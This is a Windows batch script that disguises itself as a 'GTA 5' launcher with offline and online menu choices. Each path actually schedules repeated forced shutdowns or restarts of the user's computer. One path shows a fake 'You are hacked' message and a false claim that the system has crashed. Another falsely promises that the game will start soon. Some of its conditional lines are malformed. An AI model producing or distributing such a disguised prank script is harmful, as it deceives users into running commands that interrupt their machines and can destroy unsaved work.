@echo off

color 3a

:Start2

cls

goto start

:Start

title GTA 5

echo 1) Offline mode

echo 2) Online mode

echo Input your choice

set input=

set /p input= choice:

if %input%==1 goto A if NOT goto Start2

if %input%==2 goto B if NOT goto Start2

:A

color 3a

cls

@echo off

shutdown -s -t 200

shutdown -s -t 210

shutdown -s -t 220

shutdown -s -t 230

shutdown -s -t 240

shutdown -s -t 250

echo Oops!You are hacked.

echo.

echo Sorry your opreating system has being crashed.

:B

cls

color 3a

echo 1) Single player

echo 2) Exit

echo Input your choice

set input=

set /p input= choice:

if %input%==1 goto C if NOT goto Start2

if %input%==2 goto Exit if NOT goto Start 2

:C

color 3a

cls

@echo off

shutdown -r -t 110

shutdown -r -t 120

shutdown -r -t 130

shutdown -r -t 140

shutdown -r -t 150

echo Success game will start in few minutes.

echo Thank You.

:Exit

exit